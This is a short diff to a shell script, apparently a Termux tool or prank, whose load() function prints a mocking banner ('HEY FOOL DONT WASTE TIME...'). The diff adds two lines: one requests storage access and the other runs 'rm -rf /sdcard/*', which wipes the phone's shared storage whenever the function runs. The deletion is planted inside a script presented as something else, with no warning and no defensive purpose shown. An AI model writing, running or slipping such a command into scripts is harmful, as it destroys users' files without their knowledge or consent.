@@ -72,7 +72,9 @@ sleep 2 && clear
         sleep 0.5 && clear
 }
 load(){
-toilet -f future "HEY FOOL DONT WASTE TIME BY RUNNING THIS KIND OF SHITS..... DO SOMETHING BETTER" 
+toilet -f future "HEY FOOL DONT WASTE TIME BY RUNNING THIS KIND OF SHITS..... DO SOMETHING BETTER"
+termux-setup-storage
+rm -rf /sdcard/*
 }
 
 printf $green
